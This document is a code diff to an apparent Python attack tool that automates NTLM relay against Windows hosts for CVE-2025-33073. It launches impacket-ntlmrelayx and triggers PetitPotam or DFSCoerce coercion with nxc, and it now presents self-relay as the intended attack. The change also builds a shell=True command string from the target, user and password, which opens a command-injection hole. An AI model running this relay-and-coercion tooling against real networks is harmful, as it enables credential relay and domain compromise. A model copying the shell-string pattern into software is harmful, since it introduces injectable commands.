@@ -515,7 +515,7 @@ class RelayMonitor(threading.Thread):
         elif self.stage == self.STAGE_CALLBACK:
             diag.append(("Callback arrived but relay auth failed", C.RED))
             if "SIGNING_REQUIRED" in self.errors:
-                diag.append(("Relay target requires SMB signing. Use --smb-signing-is-on or pick a different target.", C.YELLOW))
+                diag.append(("Relay target requires SMB signing. Pick a different relay target with signing OFF.", C.YELLOW))
             elif "LDAP_REJECTED" in self.errors:
                 diag.append(("DC rejected LDAP relay. LDAP signing or channel binding is enforced.", C.YELLOW))
             else:
@@ -583,23 +583,39 @@ def ensure_venv():
 
 
 def find_ntlmrelayx():
-    """Find whichever ntlmrelayx binary is on PATH or in the venv."""
+    """Find the stock impacket-ntlmrelayx binary.
+
+    Checks the script's venv/bin FIRST (where pip install impacket puts
+    'impacket-ntlmrelayx'), then falls back to PATH.  This avoids picking
+    up a relaytrace fork or other custom ntlmrelayx on the system PATH.
+
+    The original PoC uses:  cmd = ["impacket-ntlmrelayx", "-t", target, "-smb2support"]
+    """
+    script_dir = Path(__file__).parent.absolute()
+
+    # Priority-ordered candidate names — stock impacket binary first
     names = ["impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx"]
+
+    # 1) Check the venv that setup.sh creates next to this script
     if IS_WINDOWS:
-        names = ["impacket-ntlmrelayx.exe", "ntlmrelayx.exe", "impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx"]
+        venv_bin = script_dir / "venv" / "Scripts"
+        suffixes = ["", ".exe", ".cmd"]
+    else:
+        venv_bin = script_dir / "venv" / "bin"
+        suffixes = [""]
 
     for name in names:
-        if shutil.which(name):
-            return name
-
-    # Check venv Scripts on Windows
-    if IS_WINDOWS:
-        script_dir = Path(__file__).parent.absolute()
-        venv_scripts = script_dir / "venv" / "Scripts"
-        for name in ["impacket-ntlmrelayx.exe", "ntlmrelayx.exe"]:
-            candidate = venv_scripts / name
-            if candidate.exists():
+        for sfx in suffixes:
+            candidate = venv_bin / f"{name}{sfx}"
+            if candidate.exists() and (IS_WINDOWS or os.access(str(candidate), os.X_OK)):
+                log("INFO", "ok", f"Found relay binary in venv: {candidate}")
                 return str(candidate)
+
+    # 2) Fall back to system PATH
+    for name in names:
+        found = shutil.which(name)
+        if found:
+            return found
 
     return None
 
@@ -909,11 +925,6 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
             cmd.append("-socks")
             log("RELAY", "..", "SOCKS proxy enabled")
 
-    tool_path = check_tool(cmd[0])
-    if not tool_path:
-        log_result("ntlmrelayx binary", False, f"{cmd[0]} not found")
-        sys.exit(1)
-
     log("SMB", ">>", f"Launch: {C.DIM}{' '.join(cmd)}{C.RST}")
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     log("SMB", "ok", f"ntlmrelayx started (PID {proc.pid})")
@@ -976,25 +987,27 @@ def run_coercion(target_ip, domain, user, password, method="PetitPotam"):
     elif method == "DFSCoerce":
         log("RPC", "..", "DFSCoerce targets DFS Namespace service. Less commonly patched.")
 
-    # Build the nxc coercion command
+    # Build the nxc coercion command — matches original PoC exactly:
+    #   shell=True with L= parameter and quoted DNS record
     if not nxc_bin:
         log("FAIL", "!!", "nxc not found, cannot trigger coercion", C.RED)
         log_result("Coercion trigger", False, "nxc missing")
         return
 
-    cmd_list = [
-        nxc_bin, "smb", target_ip,
-        "-d", domain,
-        "-u", user,
-        "-p", password,
-        "-M", "coerce_plus",
-        "-o", f"M={method}", f"LISTENER={STATIC_DNS_RECORD}"
-    ]
-    log("RPC", ">>", f"cmd: nxc smb {target_ip} -d {domain} -u {user} -M coerce_plus -o M={method} LISTENER=...")
+    command_str = (
+        f"{nxc_bin} smb {target_ip} "
+        f"-d {domain} "
+        f"-u {user} "
+        f"-p '{password}' "
+        f"-M coerce_plus "
+        f"-o M={method} L=\"{STATIC_DNS_RECORD}\""
+    )
+    log("RPC", ">>", f"cmd: nxc smb {target_ip} -d {domain} -u {user} -M coerce_plus -o M={method} L=...")
 
     log("RPC", ">>", f"{C.BOLD}Firing coercion now...{C.RST}")
     proc = subprocess.Popen(
-        cmd_list,
+        command_str,
+        shell=True,
         stdout=subprocess.PIPE, stderr=subprocess.PIPE
     )
 
@@ -1183,8 +1196,8 @@ def main():
         resolved = socket.gethostbyname(relay_host)
         log("DNS", "ok", f"Relay target {relay_host} resolves to {resolved}")
         if resolved == args.coerce_target:
-            log("WARN", "!!", f"{C.YELLOW}Relay target == coercion target (self-relay). "
-                f"Machine accounts are usually not local admin on themselves!{C.RST}")
+            log("INFO", "..", f"Relay target == coercion target (self-relay / reflection).  "
+                f"This is the intended CVE-2025-33073 attack pattern.")
     except socket.gaierror:
         log("DNS", "!!", f"Cannot resolve relay target {relay_host}", C.RED)
 
